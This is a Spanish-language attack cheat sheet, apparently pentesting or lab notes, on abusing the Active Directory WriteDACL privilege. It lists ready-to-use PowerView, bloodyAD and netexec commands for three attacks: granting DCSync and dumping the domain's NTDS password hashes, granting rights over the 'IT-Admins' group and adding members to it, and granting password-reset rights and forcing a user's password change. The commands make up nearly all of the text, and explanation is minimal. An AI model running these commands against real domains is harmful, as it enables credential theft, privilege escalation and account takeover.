Write DACL

WriteDACL permite modificar la DACL de un objeto y conceder derechos adicionales como DCSync, GenericAll o control sobre el objetivo.

Info: WriteDACL: Privilegio que permite al usuario modificar el DACL (lista de permisos de un objeto en AD). Un objeto puede ser un usuario, un grupo, un ordenador, el dominio, OU , GPO...

La vía más directa suele ser conceder GenericAll, porque agrupa muchos permisos sobre el objeto. Aun así, conviene elegir el derecho mínimo necesario según el tipo de objeto y el objetivo de la técnica.

Aviso: WriteDACL sobre Dominio (DCSync)

Comandos

. .\PowerView.ps1
# alvaro modifica DACL del dominio y otorga a lidia el derecho DCSync
# Powershell con PowerView
Add-DomainObjectAcl -TargetIdentity "DC=<dominio>,DC=<dominio>" -PrincipalIdentity lidia -Rights DCSync
# Kali
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' add dcsync 'lidia'

# Ataque Kali: lidia con permisos DCSync puede dumpear NTDS del DC
netexec smb <ip_dc> -u 'lidia' -p 'lidia123' --ntds

Aviso: WriteDACL sobre Grupo "IT-Admins" (WriteMembers/Add Member)

Comandos

. .\PowerView.ps1
# alvaro modifica DACL del grupo IT-Admins, otorga a si mismo el derecho WriteMembers

# !!!VER CN completo EN LDAP!!!

# Powershell con PowerView
Add-DomainObjectAcl -TargetIdentity "IT-Admins" -PrincipalIdentity alvaro -Rights WriteMembers
# Kali
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' add genericAll 'cn=IT-Admins,dc=<dominio>,dc=<dominio>' 'alvaro'

# Ataque Windows: alvaro con permisos WriteMembers o GenericAll puede agregar a cualquier usuario al grupo IT-Admins
Add-DomainGroupMember -Identity "IT-Admins" -Members "lidia"
net group 'IT-Admins' 'lidia' /add /domain
# Ataque Kali: 
bloodyAD -u 'alvaro' -p 'alvaro123' -d <domain> --host <ip_dc> add groupMember 'IT-Admins' lidia

Aviso: WriteDACL sobre Usuario "lidia" (ResetPassword/ForceChangePassword)

Comandos

. .\PowerView.ps1
# alvaro modifica DACL de lidia, otorga a si mismo el derecho ResetPassword
# Powershell con PowerView
Add-DomainObjectAcl -TargetIdentity lidia -PrincipalIdentity alvaro -Rights ResetPassword
# Kali
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' add genericAll 'lidia' 'alvaro'

# Ataque Windows: alvaro puede forzar el cambio de contraseña en lidia
Set-DomainUserPassword -Identity "lidia" -AccountPassword (ConvertTo-SecureString "NuevaPass123" -AsPlainText -Force)
net user lidia NewPassword123 /domain
# Ataque Kali
nxc smb <dc_ip> -u 'alvaro' -p 'alvaro123' -M change-password -o USER=lidia NEWPASS='NewPass123'
bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u 'alvaro' -p 'alvaro123' set password 'lidia' 'NewPass123'
